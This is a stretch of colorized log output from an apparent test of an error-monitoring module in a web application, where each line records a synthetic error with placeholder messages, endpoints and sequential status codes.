WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.919105Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m86[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4298'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_98[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m498[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.919154Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m86[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4299'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_99[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m499[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.919202Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4300'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_0[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m500[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.919251Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4301'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_1[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m501[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.919299Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4302'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_2[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m502[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.919347Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4303'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_3[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m503[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.919418Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4304'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_4[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m504[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.919503Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4305'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_5[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m505[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.919567Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4306'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_6[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m506[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.919620Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4307'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_7[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m507[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.919670Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4308'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_8[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m508[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.919721Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4309'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_9[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m509[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.919770Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4310'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_10[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m510[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.919820Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4311'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_11[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m511[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.919871Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4312'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_12[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m512[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.919920Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4313'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_13[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m513[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.919969Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4314'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_14[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m514[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.920019Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4315'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_15[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m515[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.920069Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4316'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_16[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m516[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.920118Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4317'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_17[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m517[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.920168Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4318'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_18[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m518[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.920246Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4319'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_19[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m519[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.920331Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4320'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_20[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m520[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.920389Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4321'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_21[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m521[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.920442Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4322'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_22[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m522[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.920493Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4323'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_23[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m523[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.920546Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4324'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m524[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.920597Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4325'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m525[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.920647Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4326'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m526[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.920695Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4327'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m527[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.920744Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4328'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m528[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.920793Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4329'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m529[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.920840Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4330'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m530[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.920887Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4331'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m531[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.920934Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4332'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m532[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.920981Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4333'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m533[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.921029Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4334'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m534[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.921078Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4335'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m535[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.921130Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4336'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m536[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.921184Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m87[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4337'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m537[0m
